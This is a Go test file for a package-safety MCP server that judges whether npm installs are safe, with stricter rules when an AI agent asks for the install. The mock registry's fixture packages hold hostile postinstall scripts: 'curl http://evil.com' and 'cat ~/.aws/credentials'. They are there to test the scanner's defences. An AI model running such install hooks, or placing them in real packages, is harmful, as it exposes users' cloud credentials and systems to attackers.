package mcp

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/niyam-ai/pkgsafe/internal/cache"
	rnpm "github.com/niyam-ai/pkgsafe/internal/registry/npm"
	"github.com/niyam-ai/pkgsafe/internal/types"
)

func TestMCPServer(t *testing.T) {
	// Set up mock registry server
	srv := testRegistryServer(t, map[string]string{
		"1.0.0": testPackageJSON(t, "safe-package"),
		"2.0.0": testPackageJSON(t, "postinstall-curl"),
		"3.0.0": testPackageJSON(t, "reads-credentials"),
	}, "1.0.0")
	defer srv.Close()

	// Direct DefaultRegistryURL to mock registry
	oldURL := rnpm.DefaultRegistryURL
	rnpm.DefaultRegistryURL = srv.URL
	defer func() { rnpm.DefaultRegistryURL = oldURL }()

	// Write a temp policy file for testing
	tempDir := t.TempDir()
	policyPath := filepath.Join(tempDir, "policy.yaml")
	defaultPolicyBytes, err := os.ReadFile("../../default-policy.yaml")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(policyPath, defaultPolicyBytes, 0644); err != nil {
		t.Fatal(err)
	}

	config := ServerConfig{
		PolicyPath: policyPath,
		LogLevel:   "debug",
	}

	// 1. Tool discovery returns expected tools
	t.Run("tools/list", func(t *testing.T) {
		inReader, inWriter := io.Pipe()
		outReader, outWriter := io.Pipe()
		defer inWriter.Close()
		defer outWriter.Close()

		go func() {
			_ = Serve(config, inReader, outWriter)
		}()

		req := Request{
			JSONRPC: "2.0",
			ID:      1,
			Method:  "tools/list",
		}
		writeReq(t, inWriter, req)

		var resp Response
		readResp(t, outReader, &resp)

		if resp.Error != nil {
			t.Fatalf("unexpected error: %v", resp.Error)
		}

		var toolList ToolListResult
		b, err := json.Marshal(resp.Result)
		if err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal(b, &toolList); err != nil {
			t.Fatal(err)
		}

		expected := []string{
			"validate_package_install",
			"explain_package_risk",
			"score_lockfile",
			"suggest_safe_alternative",
			"validate_install_command",
		}

		for _, name := range expected {
			found := false
			for _, tool := range toolList.Tools {
				if tool.Name == name {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("missing expected tool: %s", name)
			}
		}
	})

	// Helper to run tools/call on the server
	callTool := func(t *testing.T, toolName string, arguments any) (CallToolResult, error) {
		t.Helper()
		inReader, inWriter := io.Pipe()
		outReader, outWriter := io.Pipe()
		defer inWriter.Close()
		defer outWriter.Close()

		go func() {
			_ = Serve(config, inReader, outWriter)
		}()

		argsBytes, err := json.Marshal(arguments)
		if err != nil {
			t.Fatal(err)
		}
		req := Request{
			JSONRPC: "2.0",
			ID:      1,
			Method:  "tools/call",
			Params: json.RawMessage(fmtCallParams(toolName, argsBytes)),
		}
		writeReq(t, inWriter, req)

		var resp Response
		readResp(t, outReader, &resp)

		if resp.Error != nil {
			return CallToolResult{}, resp.Error
		}

		var res CallToolResult
		b, err := json.Marshal(resp.Result)
		if err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal(b, &res); err != nil {
			t.Fatal(err)
		}
		return res, nil
	}

	// 2. validate_package_install returns allow for safe package
	t.Run("validate_package_install safe package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "1.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "allow" {
			t.Errorf("expected decision allow, got %s", valRes.Decision)
		}
		if !valRes.InstallAllowed {
			t.Errorf("expected install_allowed true, got false")
		}
	})

	// 3. validate_package_install returns warn for suspicious package
	t.Run("validate_package_install suspicious package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "2.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" {
			t.Errorf("expected decision warn, got %s", valRes.Decision)
		}
	})

	// 4. validate_package_install returns block for credential-risk package
	t.Run("validate_package_install credential-risk package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "3.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "block" {
			t.Errorf("expected decision block, got %s", valRes.Decision)
		}
		if valRes.InstallAllowed {
			t.Errorf("expected install_allowed false, got true")
		}
	})

	// 5. requested_by = ai_agent with warn sets install_allowed = false
	t.Run("ai_agent requested warn package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "2.0.0",
			"requested_by": "ai_agent",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" && valRes.Decision != "block" {
			t.Errorf("expected decision warn or block, got %s", valRes.Decision)
		}
		if valRes.InstallAllowed {
			t.Errorf("expected install_allowed false for ai_agent, got true")
		}
		// Confirm the ai_agent_requested_suspicious_package rule is in reasons
		foundAgentRule := false
		for _, r := range valRes.Reasons {
			if r.ID == "ai_agent_requested_suspicious_package" {
				foundAgentRule = true
				break
			}
		}
		if !foundAgentRule {
			t.Errorf("expected ai_agent_requested_suspicious_package to be in reasons")
		}
	})

	// 6. requested_by = human with warn sets install_allowed = true
	t.Run("human requested warn package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "2.0.0",
			"requested_by": "human",
			"mode":         "warn",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" {
			t.Errorf("expected decision warn, got %s", valRes.Decision)
		}
		if !valRes.InstallAllowed {
			t.Errorf("expected install_allowed true for human in warn mode, got false")
		}
	})

	// 7. explain_package_risk returns metadata summary
	t.Run("explain_package_risk", func(t *testing.T) {
		res, err := callTool(t, "explain_package_risk", map[string]any{
			"ecosystem": "npm",
			"name":      "fixture",
			"version":   "2.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var expRes ExplainPackageRiskResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &expRes); err != nil {
			t.Fatal(err)
		}

		if expRes.Summary == "" {
			t.Errorf("expected non-empty summary")
		}
		if len(expRes.TopRisks) == 0 {
			t.Errorf("expected top risks listed")
		}
		if expRes.Metadata.LatestVersion != "2.0.0" {
			t.Errorf("expected metadata latest version 2.0.0, got %s", expRes.Metadata.LatestVersion)
		}
	})

	// 8. score_lockfile returns summary counts
	t.Run("score_lockfile", func(t *testing.T) {
		res, err := callTool(t, "score_lockfile", map[string]any{
			"path":      "../../testdata/npm/package-lock.json",
			"ecosystem": "npm",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var slRes ScoreLockfileResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &slRes); err != nil {
			t.Fatal(err)
		}

		if slRes.Summary.TotalPackages != 2 {
			t.Errorf("expected 2 packages in lockfile, got %d", slRes.Summary.TotalPackages)
		}
		if slRes.Summary.Warn != 1 {
			t.Errorf("expected 1 warning (axois typosquat), got %d", slRes.Summary.Warn)
		}
	})

	// 9. suggest_safe_alternative returns curated alternatives
	t.Run("suggest_safe_alternative curated", func(t *testing.T) {
		res, err := callTool(t, "suggest_safe_alternative", map[string]any{
			"ecosystem":         "npm",
			"requested_package": "react-markdown-renderer-plus",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var ssaRes SuggestSafeAlternativeResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &ssaRes); err != nil {
			t.Fatal(err)
		}

		if len(ssaRes.Alternatives) == 0 {
			t.Fatalf("expected alternatives, got none")
		}
		if ssaRes.Alternatives[0].Name != "react-markdown" {
			t.Errorf("expected react-markdown alternative, got %s", ssaRes.Alternatives[0].Name)
		}
	})

	t.Run("suggest_safe_alternative dynamic heuristic", func(t *testing.T) {
		res, err := callTool(t, "suggest_safe_alternative", map[string]any{
			"ecosystem":         "npm",
			"requested_package": "axios-pro",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var ssaRes SuggestSafeAlternativeResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &ssaRes); err != nil {
			t.Fatal(err)
		}

		if len(ssaRes.Alternatives) == 0 {
			t.Fatalf("expected alternatives, got none")
		}
		if ssaRes.Alternatives[0].Name != "axios" {
			t.Errorf("expected axios alternative, got %s", ssaRes.Alternatives[0].Name)
		}
	})

	// 10. validate_install_command parses npm install axios
	t.Run("validate_install_command single", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "npm install fixture@1.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var vicRes ValidateInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &vicRes); err != nil {
			t.Fatal(err)
		}

		if len(vicRes.Packages) != 1 {
			t.Fatalf("expected 1 package, got %d", len(vicRes.Packages))
		}
		if vicRes.Packages[0].Name != "safe-example" {
			t.Errorf("expected package safe-example, got %s", vicRes.Packages[0].Name)
		}
	})

	// 11. validate_install_command parses multiple packages
	t.Run("validate_install_command multiple", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "npm i fixture@1.0.0 fixture@2.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var vicRes ValidateInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &vicRes); err != nil {
			t.Fatal(err)
		}

		if len(vicRes.Packages) != 2 {
			t.Fatalf("expected 2 packages, got %d", len(vicRes.Packages))
		}
	})

	// 12. validate_install_command rejects unsupported commands
	t.Run("validate_install_command unsupported", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "yarn add lodash",
		})
		if err != nil {
			t.Fatal(err)
		}
		if !res.IsError {
			t.Fatalf("expected tool execution error, got success")
		}

		var te ToolError
		if err := json.Unmarshal([]byte(res.Content[0].Text), &te); err != nil {
			t.Fatal(err)
		}
		if te.Error.Code != "INVALID_INSTALL_COMMAND" {
			t.Errorf("expected error code INVALID_INSTALL_COMMAND, got %s", te.Error.Code)
		}
	})

	// 13. Offline MCP mode uses local cache
	t.Run("offline mode cache check", func(t *testing.T) {
		store, err := cache.Load("")
		if err != nil {
			t.Fatal(err)
		}
		// Write a dummy cached result for a fake package
		fakeRes := types.ScanResult{
			Package: types.PackageIdentity{
				Ecosystem: "npm",
				Name:      "fake-offline-pkg",
				Version:   "1.2.3",
			},
			Decision: types.DecisionAllow,
			Score:    5,
		}
		if err := store.Put(fakeRes); err != nil {
			t.Fatal(err)
		}

		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem": "npm",
			"name":      "fake-offline-pkg",
			"version":   "1.2.3",
			"offline":   true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error in offline: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Package != "fake-offline-pkg" || valRes.Version != "1.2.3" {
			t.Errorf("expected fake-offline-pkg@1.2.3, got %s@%s", valRes.Package, valRes.Version)
		}
	})

	// 14. Invalid package returns structured error
	t.Run("invalid package not found error", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem": "npm",
			"name":      "non-existent-package-404",
			"version":   "latest",
		})
		if err != nil {
			t.Fatal(err)
		}
		if !res.IsError {
			t.Fatalf("expected tool execution error, got success")
		}

		var te ToolError
		if err := json.Unmarshal([]byte(res.Content[0].Text), &te); err != nil {
			t.Fatal(err)
		}
		if te.Error.Code != "PACKAGE_NOT_FOUND" {
			t.Errorf("expected error code PACKAGE_NOT_FOUND, got %s", te.Error.Code)
		}
	})

	// 15. MCP server starts without printing non-JSON text to stdout
	t.Run("starts clean", func(t *testing.T) {
		inReader := strings.NewReader("")
		var outBuf bytes.Buffer
		err := Serve(config, inReader, &outBuf)
		if err != nil {
			t.Fatal(err)
		}
		// Stderr should not leak into stdout
		if outBuf.Len() > 0 {
			t.Fatalf("stdout contains unrequested output: %q", outBuf.String())
		}
	})
}

func fmtCallParams(toolName string, args []byte) string {
	return `{"name":"` + toolName + `","arguments":` + string(args) + `}`
}

func writeReq(t *testing.T, w io.Writer, req Request) {
	t.Helper()
	b, err := json.Marshal(req)
	if err != nil {
		t.Fatal(err)
	}
	_, err = w.Write(append(b, '\n'))
	if err != nil {
		t.Fatal(err)
	}
}

func readResp(t *testing.T, r io.Reader, resp *Response) {
	t.Helper()
	dec := json.NewDecoder(r)
	if err := dec.Decode(resp); err != nil {
		t.Fatal(err)
	}
}

func testRegistryServer(t *testing.T, versions map[string]string, latest string) *httptest.Server {
	t.Helper()
	tarballs := map[string][]byte{}
	for version, pkgJSON := range versions {
		tarballs["/tarballs/fixture-"+version+".tgz"] = testMakeTarball(t, map[string]string{
			"package/package.json": pkgJSON,
		})
	}

	mux := http.NewServeMux()
	var srv *httptest.Server
	mux.HandleFunc("/fixture", func(w http.ResponseWriter, r *http.Request) {
		type dist struct {
			Tarball   string `json:"tarball"`
			Integrity string `json:"integrity"`
		}
		type versionMetadata struct {
			Name    string            `json:"name"`
			Version string            `json:"version"`
			Scripts map[string]string `json:"scripts,omitempty"`
			Dist    dist              `json:"dist"`
		}
		body := struct {
			Name     string                     `json:"name"`
			DistTags map[string]string          `json:"dist-tags"`
			Versions map[string]versionMetadata `json:"versions"`
		}{
			Name:     "fixture",
			DistTags: map[string]string{"latest": latest},
			Versions: map[string]versionMetadata{},
		}
		for version := range versions {
			tarball := tarballs["/tarballs/fixture-"+version+".tgz"]
			sum := sha512.Sum512(tarball)
			var scripts map[string]string
			if version == "2.0.0" {
				scripts = map[string]string{"postinstall": "curl http://evil.com"}
			} else if version == "3.0.0" {
				scripts = map[string]string{"postinstall": "cat ~/.aws/credentials"}
			}
			body.Versions[version] = versionMetadata{
				Name:    "fixture",
				Version: version,
				Scripts: scripts,
				Dist: dist{
					Tarball:   srv.URL + "/tarballs/fixture-" + version + ".tgz",
					Integrity: "sha512-" + base64.StdEncoding.EncodeToString(sum[:]),
				},
			}
		}
		_ = json.NewEncoder(w).Encode(body)
	})
	mux.HandleFunc("/tarballs/", func(w http.ResponseWriter, r *http.Request) {
		b, ok := tarballs[r.URL.Path]
		if !ok {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(b)
	})
	mux.HandleFunc("/non-existent-package-404", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = w.Write([]byte(`{"error":"Not Found"}`))
	})
	srv = httptest.NewServer(mux)
	return srv
}

func testPackageJSON(t *testing.T, fixture string) string {
	t.Helper()
	path := filepath.Join("..", "..", "testdata", "npm", fixture, "package.json")
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func testMakeTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, content := range files {
		hdr := &tar.Header{
			Name: name,
			Mode: 0644,
			Size: int64(len(content)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}
